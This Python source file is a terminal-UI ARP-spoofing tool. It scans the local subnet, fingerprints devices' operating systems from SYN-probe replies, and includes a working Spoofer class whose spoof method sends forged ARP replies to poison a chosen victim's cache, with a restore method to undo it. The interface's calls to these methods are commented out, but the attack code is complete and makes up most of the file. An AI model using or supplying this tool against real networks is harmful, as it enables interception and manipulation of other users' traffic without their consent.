from scapy.all import *
from scapy.layers.l2 import ARP
from textual.app import App, ComposeResult
from textual.containers import Horizontal, VerticalScroll, Container, Vertical
from textual.widgets import Header, Footer, Input, Button, DataTable, Static, Label
from textual._on import *

class Spoofer:
    def __init__(self):
        self.my_mac = get_if_hwaddr([i for i in get_if_list() if "wlan" in i][0])

    def get_own_ip_address(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip_addr = s.getsockname()[0]
        s.close()
        return ip_addr

    def get_router_ip_addr(self, own_ip):
        router_ip = own_ip[:own_ip.rfind(".")] + ".1"
        return router_ip

    #router_addr = get_router_ip_addr(get_own_ip_address())

    def get_os(self, ip, port):
        ip_p = IP(dst=ip)
        tcp_p = TCP(dport=port, flags="S")
        packet = ip_p / tcp_p
        response = sr1(packet, timeout=0.01, verbose=False)
        if not response:
            return None
        if response.haslayer(TCP):
            tcp_layer = response.getlayer(TCP)
            if "R" in tcp_layer.flags:
                return None
            ip_layer = response.getlayer(IP)
            window = tcp_layer.window
            ttl = ip_layer.ttl
            if ttl <= 64 and window in [32120, 5840]:
                return "~Linux"
            elif ttl <= 128:
                return "~Windows"
            elif ttl >= 200:
                return "~Cisco/Network Device"


            return None


    def request(self, ip):
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        return arp_request

    def get_devices(self, ips):
        arp_request = self.request(ips)
        answered, unanswered = srp(arp_request, timeout=1, verbose=False)
        devices = []
        for sent, received in answered:
            device = {}
            device["ip"] = received.psrc
            print(received.psrc)
            info = None
            for port in [80, 49152]:
                info = self.get_os(received.psrc, port)
                print(port)
                if info:
                    break
            if not info:
                info = "Unknown"
            if device["ip"][::-1][:2] == "1.":
                info = "Network Device"
            device["os"] = info
            print(info)
            device["mac"] = received.hwsrc
            devices.append(device)
        return devices

    def get_mac(self, ip):
        arp_request = self.request(ip)
        answered, unanswered = srp(arp_request, timeout=2, verbose=False)
        if answered:
            return answered[0][1].hwsrc
        return None

    def spoof(self, pretending_ip, victim_ip):
        packet = ARP(op=2, hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip, hwsrc=self.my_mac)
        send(packet, verbose=False)
    def restore(self, pretending_ip, victim_ip):
        packet = ARP(op=2, hwsrc=self.get_mac(pretending_ip), hwdst=self.get_mac(victim_ip), pdst=victim_ip, psrc=pretending_ip)
        send(packet, verbose=False)

    def get_ip_range(self, limit):
        return self.get_router_ip_addr(self.get_own_ip_address()) + "/" + str(limit)



class RestoreButton(Button):
    def __init__(self, number_for_delete, v_ip, p_ip, **kwargs):
        super().__init__(**kwargs)
        self.v_ip = v_ip
        self.p_ip = p_ip
        self.number_for_delete = number_for_delete




class SpoofApp(App):
    CSS = """
        Input {
            width: 50%;
        }
        
        Button {
            
        }
        
        Horizontal {
            margin-left: 5;
            margin-top: 1;
            margin-bottom: 1;
            
            height: auto; 

        }
        #ips {
            width: 50%;
            height: auto;
        }
        
        #info_container {
            margin-left: 20;
        }
        
        Vertical {
            margin-bottom: 3;
            margin-top: 1;
            
            border: dodgerblue;
            width: 40%;
            overflow-y: auto; 
            overflow-x: auto;
        }
        
        #d_table {
            margin-left: 10;
            margin-top: 2;
            width: auto;
        }
            
        #horizontal {
            width: 100%;
            
        }
        
        #victim {
            width: 100%;
        }
        
        #pretending {
            width: 100%;
        }
        
        #spoof {
        margin-top: 2;
            margin-left: 8;
        }
        
        #vertical_right {
            width: 1fr;
            margin-right: 5;
            margin-top: 1;
        }
        
        
        #restore {
            margin-left: 5;
        }
        
        #spoof_info {
            margin-top: 1;
        }
        
        """

    def __init__(self):
        super().__init__()
        self.spoofer = Spoofer()
        self.info_count = 0


    def compose(self) -> ComposeResult:
        with Horizontal(id="horizontal"):

            yield Vertical(Horizontal(
         Input(placeholder="Limit ip range", type="integer", id="limit"),
                Button("scan", id="enter_limit"))
            ,DataTable(id="d_table")
        )


            with Vertical(id="vertical_right"):
                    with Horizontal():
                        with Container(id="ips"):
                            yield Input(placeholder="victim ip", id="victim")
                            yield Input(placeholder="pretending ip", id="pretending")


                        yield Button("spoof", id="spoof")

                    yield VerticalScroll(Container(id="info_container"))

    @on(Button.Pressed, "#enter_limit")
    async def on__b_enter_limit(self) -> None:
        self.run_worker(self.print_devices(), exclusive=True)


    async def print_devices(self) -> None:

        limit = self.query_one("#limit", Input)
        self.generate_device_table(self.spoofer.get_devices(self.spoofer.get_ip_range(limit.value)))


    def generate_device_table(self, device_list):
        data_table = self.query_one("#d_table", DataTable)
        data_table.clear(columns=True)
        data_table.add_column("ip")
        data_table.add_column("mac")
        data_table.add_column("os")
        for i in device_list:
            data_table.add_row(i["ip"], i["mac"], i["os"])

    @on(Button.Pressed, "#spoof")
    async def on__b_spoof(self) -> None:
        self.run_worker(self.spoof(), exclusive=True)

    async def spoof(self):
        v_ip = str(self.query_one("#victim", Input).value)
        p_ip = str(self.query_one("#pretending", Input).value)
        # self.spoofer.spoof(v_ip, p_ip)
        container = self.query_one("#info_container", Container)
        horizontal = Horizontal(id="horizontal_info" + str(self.info_count))

        horizontal.compose_add_child(Label(f"for {v_ip} you're {p_ip}", id="spoof_info"))
        horizontal.compose_add_child(RestoreButton(self.info_count, v_ip, p_ip, label="restore", id="restore"))
        self.info_count += 1
        await container.mount(horizontal)

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        button = event.button
        if button.id == "restore":
            button.__class__ = RestoreButton
            self.run_worker(self.restore(button.number_for_delete, button.v_ip, button.p_ip), exclusive=True)

    async def restore(self, delete, v_ip, p_ip):
        # self.spoofer.restore(v_ip, p_ip)
        horizontal_info = self.query_one("#horizontal_info" + str(delete), Horizontal)
        await horizontal_info.remove()





if __name__ == "__main__":
    app = SpoofApp()
    app.run()